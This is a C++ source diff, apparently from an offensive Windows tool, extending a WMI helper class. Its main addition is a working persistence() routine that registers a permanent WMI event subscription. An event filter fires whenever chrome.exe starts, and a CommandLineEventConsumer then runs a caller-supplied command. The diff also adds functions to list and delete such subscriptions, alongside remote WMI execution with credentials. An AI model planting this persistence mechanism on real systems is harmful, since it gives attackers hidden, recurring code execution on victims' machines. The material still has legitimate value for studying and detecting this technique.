@@ -20,7 +20,7 @@ bool WMI::execute(const char* host, const char* username, const char* password, 
 	IWbemLocator* wbemLocator = NULL;
 	IWbemServices* wbemServices = NULL;
 
-	bool success = this->setUpWBEM(host, username, password, &wbemLocator, &wbemServices);
+	bool success = this->setUpWBEM(L"ROOT\\CIMV2", host, username, password, &wbemLocator, &wbemServices);
 	if (!success)
 		return false;
 
@@ -163,7 +163,7 @@ bool WMI::initializeCom() {
 	return true;
 }
 
-bool WMI::setUpWBEM(const char* host, const char* username, const char* password, IWbemLocator** wbemLocator, IWbemServices** wbemServices) {
+bool WMI::setUpWBEM(const wchar_t* wmi_namespace, const char* host, const char* username, const char* password, IWbemLocator** wbemLocator, IWbemServices** wbemServices) {
 	// Step 3: ---------------------------------------------------
 	// Obtain the initial locator to WMI -------------------------
 	HRESULT hres = CoCreateInstance(
@@ -196,7 +196,7 @@ bool WMI::setUpWBEM(const char* host, const char* username, const char* password
 	if (host == NULL)
 	{
 		hres = (*wbemLocator)->ConnectServer(
-			_bstr_t(L"ROOT\\CIMV2"), // Object path of WMI namespace
+			_bstr_t(wmi_namespace), // Object path of WMI namespace  L"ROOT\\CIMV2"
 			nullptr,                    // User name. NULL = current user
 			nullptr,                    // User password. NULL = current
 			0,                       // Locale. NULL indicates current
@@ -209,7 +209,7 @@ bool WMI::setUpWBEM(const char* host, const char* username, const char* password
 	else
 	{
 		MultiByteToWideChar(CP_ACP, 0, host, -1, w_host, MAX_PATH);
-		swprintf_s(w_namespace, MAX_PATH, L"\\\\%s\\root\\CIMV2", w_host);
+		swprintf_s(w_namespace, MAX_PATH, L"\\\\%s\\%s", w_host, wmi_namespace);
 
 		if (username != NULL)
 		{
@@ -335,4 +335,413 @@ bool WMI::setUpWBEM(const char* host, const char* username, const char* password
 	}
 
 	return true;
+}
+
+bool WMI::persistence(const wchar_t* ef_class_name, const wchar_t* ec_class_name, const wchar_t* command)
+{
+	// Source: https://github.com/wumb0/sh3llparty/blob/master/wmicallback.cpp
+
+	bool success = false;
+
+	IWbemLocator* wbemLocator = NULL;
+	IWbemServices* wbemServices = NULL;
+
+	bool success_setUpWBEM = this->setUpWBEM(L"ROOT\\SUBSCRIPTION", NULL, NULL, NULL, &wbemLocator, &wbemServices);
+	if (!success_setUpWBEM)
+		return false;
+
+	HRESULT hres;
+	BSTR ClassName;
+	IWbemClassObject* ef = NULL, * ec = NULL, * e2c = NULL, * ti = NULL;
+	IWbemClassObject* eventConsumer = NULL, * eventFilter = NULL, * f2cBinding = NULL, * timerinstruction = NULL;
+
+	std::wstring str1, str2;
+
+	ClassName = SysAllocString(L"CommandLineEventConsumer");
+	hres = wbemServices->GetObject(ClassName, 0, NULL, &eventConsumer, NULL);
+	SysFreeString(ClassName);
+	if (FAILED(hres))
+	{
+#ifdef DEBUG
+		printf("Failed to get object CommandLineEventConsumer: %x\n", hres);
+#endif
+		goto rip;
+	}
+
+	ClassName = SysAllocString(L"__EventFilter");
+	hres = wbemServices->GetObject(ClassName, 0, NULL, &eventFilter, NULL);
+	SysFreeString(ClassName);
+	if (FAILED(hres))
+	{
+#ifdef DEBUG
+		printf("Failed to get object __EventFilter: %d\n", hres);
+#endif
+
+		goto rip;
+	}
+
+	ClassName = SysAllocString(L"__FilterToConsumerBinding");
+	hres = wbemServices->GetObject(ClassName, 0, NULL, &f2cBinding, NULL);
+	SysFreeString(ClassName);
+	if (FAILED(hres))
+	{
+#ifdef DEBUG
+		printf("Failed to get object __FilterToConsumerBinding: %d\n", hres);
+#endif
+
+		goto rip;
+	}
+
+	ClassName = SysAllocString(L"__IntervalTimerInstruction");
+	hres = wbemServices->GetObject(ClassName, 0, NULL, &timerinstruction, NULL);
+	SysFreeString(ClassName);
+	if (FAILED(hres))
+	{
+#ifdef DEBUG
+		printf("Failed to get object __IntervalTimerInstruction: %d\n", hres);
+#endif
+
+		goto rip;
+	}
+
+	//spawn __EventFilter class instance
+	hres = eventFilter->SpawnInstance(0, &ef);
+	if (FAILED(hres)) {
+#ifdef DEBUG
+		printf("Failed to get spawn __EventFilter: %d\n", hres);
+#endif
+		goto rip;
+	}
+
+	// Set parameters
+	VARIANT var;
+	var.vt = VT_BSTR;
+
+	// Set Name
+	var.bstrVal = _bstr_t(ef_class_name);
+	hres = ef->Put(L"Name", 0, &var, CIM_STRING);
+
+	// Set QueryLanguage
+	var.bstrVal = _bstr_t(L"WQL");
+	hres = ef->Put(L"QueryLanguage", 0, &var, CIM_STRING);
+
+	// Set Query
+	var.bstrVal = _bstr_t(L"SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA \"Win32_Process\" AND TargetInstance.Caption = \"chrome.exe\"");
+	hres = ef->Put(L"Query", 0, &var, CIM_STRING);
+
+	hres = wbemServices->PutInstance(ef, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
+	if (FAILED(hres)) {
+#ifdef DEBUG
+		printf("Failed to put instance __EventFilter: %d\n", hres);
+#endif
+		goto rip;
+	}
+
+
+	//spawn CommandLineEventConsumer  class instance
+	hres = eventConsumer->SpawnInstance(0, &ec);
+	if (FAILED(hres)) {
+#ifdef DEBUG
+		printf("Failed to get spawn CommandLineEventConsumer : %d\n", hres);
+#endif
+		goto rip;
+	}
+
+	// Set Name
+	var.bstrVal = _bstr_t(ec_class_name);
+	hres = ec->Put(L"Name", 0, &var, CIM_STRING);
+
+	// Set CommandLineTemplate
+	var.bstrVal = _bstr_t(command);
+	hres = ec->Put(L"CommandLineTemplate", 0, &var, CIM_STRING);
+
+	hres = wbemServices->PutInstance(ec, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
+	if (FAILED(hres)) {
+#ifdef DEBUG
+		printf("Failed to put instance CommandLineEventConsumer: %d\n", hres);
+#endif
+		goto rip;
+	}
+
+
+	//spawn __FilterToConsumerBinding   class instance
+	hres = f2cBinding->SpawnInstance(0, &e2c);
+	if (FAILED(hres)) {
+#ifdef DEBUG
+		printf("Failed to get spawn __FilterToConsumerBinding : %d\n", hres);
+#endif
+		goto rip;
+	}
+
+	// Set Name
+	str1 = L"CommandLineEventConsumer.Name=\"" + std::wstring(ec_class_name) + L"\"";
+	var.bstrVal = _bstr_t(str1.c_str());
+	hres = e2c->Put(L"Consumer", 0, &var, CIM_REFERENCE);
+
+	// Set CommandLineTemplate
+	str2 = L"__EventFilter.Name=\"" + std::wstring(ef_class_name) + L"\"";
+	var.bstrVal = _bstr_t(str2.c_str());
+	hres = e2c->Put(L"Filter", 0, &var, CIM_REFERENCE);
+
+	hres = wbemServices->PutInstance(e2c, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
+	if (FAILED(hres)) {
+#ifdef DEBUG
+		printf("Failed to put instance CommandLineEventConsumer: %d\n", hres);
+#endif
+		goto rip;
+	}
+
+
+	// Add __IntervalTimerInstruction if required 
+
+	success = true;
+
+rip:
+	if (ti)
+		ti->Release();
+	if (e2c)
+		e2c->Release();
+	if (ef)
+		ef->Release();
+	if (ec)
+		ec->Release();
+	ti = ec = ef = e2c = NULL;
+	if (eventConsumer)
+		eventConsumer->Release();
+	if (eventFilter)
+		eventFilter->Release();
+	if (f2cBinding)
+		f2cBinding->Release();
+	if (timerinstruction)
+		timerinstruction->Release();
+
+	wbemServices->Release();
+	wbemLocator->Release();
+
+	return success;
+}
+
+std::list<Object>* WMI::list_event_filters()
+{
+	return this->list_class_objects(L"__EventFilter");
+}
+
+std::list<Object>* WMI::list_event_consumers()
+{
+	return this->list_class_objects(L"__EventConsumer");
+}
+
+std::list<Object>* WMI::list_event_filter_to_consumers()
+{
+	return this->list_class_objects(L"__FilterToConsumerBinding");
+}
+
+std::list<Object>* WMI::list_class_objects(const wchar_t* class_name)
+{
+	std::list<Object>* object_list = NULL;
+
+	IWbemLocator* wbemLocator = NULL;
+	IWbemServices* wbemServices = NULL;
+
+	bool success_setUpWBEM = this->setUpWBEM(L"ROOT\\SUBSCRIPTION", NULL, NULL, NULL, &wbemLocator, &wbemServices);
+	if (!success_setUpWBEM)
+		return NULL;
+
+	HRESULT hres;
+	BSTR ClassName;
+	IEnumWbemClassObject* enumClassObject = NULL;
+	ULONG nb_objects;
+	IWbemClassObject* eventConsumer[10];
+
+	ClassName = SysAllocString(class_name);
+	hres = wbemServices->CreateInstanceEnum(ClassName, WBEM_FLAG_FORWARD_ONLY, NULL, &enumClassObject);
+	SysFreeString(ClassName);
+	if (FAILED(hres))
+	{
+#ifdef DEBUG
+		wprintf(L"Failed to enum %s: %x\n", class_name, hres);
+#endif
+		goto rip;
+	}
+
+	object_list = new std::list<Object>();
+
+	while (enumClassObject->Next(0, 10, eventConsumer, &nb_objects) != WBEM_S_NO_MORE_DATA)
+	{
+		if (nb_objects == 0)
+			break;
+
+		for (ULONG n = 0; n < nb_objects; n++)
+		{
+			Object object;
+
+			eventConsumer[n]->BeginEnumeration(NULL);
+
+			BSTR bName; // used to get name of attribute
+			VARIANT val; // WMI attribute
+			CIMTYPE type; // WMI attribute type
+
+			while (eventConsumer[n]->Next(0, &bName, &val, &type, NULL) != WBEM_S_NO_MORE_DATA)
+			{
+				if (val.vt == VT_NULL) // VT_NULL
+				{
+					object.add(Entry((wchar_t*)bName, L"VT_NULL", L"(null)"));
+				}
+				else if (val.vt == VT_I2) // VT_I2
+				{
+					object.add(Entry((wchar_t*)bName, L"VT_I2", std::to_wstring(val.intVal)));
+				}
+				else if (val.vt == VT_I4) // VT_I4
+				{
+					object.add(Entry((wchar_t*)bName, L"VT_I4", std::to_wstring(val.intVal)));
+				}
+				else if (val.vt == VT_BOOL) // VT_BOOL 
+				{
+					object.add(Entry((wchar_t*)bName, L"VT_BOOL", std::to_wstring(val.intVal)));
+				}
+				else if (val.vt == VT_UI4) // VT_UI4 
+				{
+					object.add(Entry((wchar_t*)bName, L"VT_UI4", std::to_wstring(val.uintVal)));
+				}
+				else if (val.vt == VT_BSTR) // VT_BSTR  
+				{
+					object.add(Entry((wchar_t*)bName, L"VT_BSTR", (wchar_t*)val.bstrVal));
+				}
+				else
+				{
+					object.add(Entry((wchar_t*)bName, std::to_wstring(val.vt).c_str(), L"Unknown"));
+				}
+
+				VariantClear(&val);
+				SysFreeString(bName);
+			}
+
+			eventConsumer[n]->EndEnumeration();
+
+			eventConsumer[n]->Release();
+
+			object_list->push_back(object);
+		}
+	}
+
+rip:
+
+	wbemServices->Release();
+	wbemLocator->Release();
+
+	return object_list;
+}
+
+bool WMI::delete_object(const wchar_t* class_name, const wchar_t* instance_name)
+{
+	IWbemLocator* wbemLocator = NULL;
+	IWbemServices* wbemServices = NULL;
+
+	bool success_setUpWBEM = this->setUpWBEM(L"ROOT\\SUBSCRIPTION", NULL, NULL, NULL, &wbemLocator, &wbemServices);
+	if (!success_setUpWBEM)
+		return NULL;
+
+	std::wstring query = std::wstring(class_name) + L".Name=\"" + instance_name + L"\"";
+
+	HRESULT hres;
+	BSTR objPath = SysAllocString(query.c_str());
+
+	hres = wbemServices->DeleteInstance(
+		objPath,
+		0L, NULL, NULL);
+	SysFreeString(objPath);
+
+	if (hres == ERROR_SUCCESS)
+	{
+		return true;
+	}
+	else
+	{
+#ifdef DEBUG
+		printf("Failed deleting object: %x\n", hres);
+#endif
+		return false;
+	}
+}
+
+bool WMI::delete_persistence(const wchar_t* ef_class_name, const wchar_t* ec_class_name)
+{
+	IWbemLocator* wbemLocator = NULL;
+	IWbemServices* wbemServices = NULL;
+
+	bool success_setUpWBEM = this->setUpWBEM(L"ROOT\\SUBSCRIPTION", NULL, NULL, NULL, &wbemLocator, &wbemServices);
+	if (!success_setUpWBEM)
+		return NULL;
+
+	bool failed = false;
+	HRESULT hres;
+
+	std::wstring query = std::wstring(L"__EventFilter.Name=\"") + ef_class_name + L"\"";
+	BSTR objPath = SysAllocString(query.c_str());
+
+	hres = wbemServices->DeleteInstance(
+		objPath,
+		0L, NULL, NULL);
+	SysFreeString(objPath);
+
+	if (hres != ERROR_SUCCESS)
+	{
+#ifdef DEBUG
+		printf("Failed deleting event filter: %x\n", hres);
+#endif
+		failed = true;
+	}
+
+	query = std::wstring(L"CommandLineEventConsumer.Name=\"") + ec_class_name + L"\"";
+	objPath = SysAllocString(query.c_str());
+
+	hres = wbemServices->DeleteInstance(
+		objPath,
+		0L, NULL, NULL);
+	SysFreeString(objPath);
+
+	if (hres != ERROR_SUCCESS)
+	{
+#ifdef DEBUG
+		printf("Failed deleting event consumer: %x\n", hres);
+#endif
+		failed = true;
+	}
+
+	query = std::wstring(L"__FilterToConsumerBinding.Consumer=\"CommandLineEventConsumer.Name=\\\"") + ec_class_name + L"\\\"\",Filter=\"__EventFilter.Name=\\\"" + ef_class_name + L"\\\"\"";
+	objPath = SysAllocString(query.c_str());
+
+	wprintf(L"%s\n", query.c_str());
+
+	hres = wbemServices->DeleteInstance(
+		objPath,
+		0L, NULL, NULL);
+	SysFreeString(objPath);
+
+	if (hres != ERROR_SUCCESS)
+	{
+#ifdef DEBUG
+		printf("Failed deleting filter 2 consumer: %x\n", hres);
+#endif
+		failed = true;
+	}
+
+	return !failed;
+}
+
+
+Entry::Entry(const wchar_t* name, const wchar_t* type, std::wstring value)
+{
+	this->name = std::wstring(name);
+	this->type = std::wstring(type);
+	this->value = value;
+}
+
+Object::Object()
+{
+}
+
+void Object::add(Entry entry)
+{
+	this->entry_list.push_back(entry);
 }
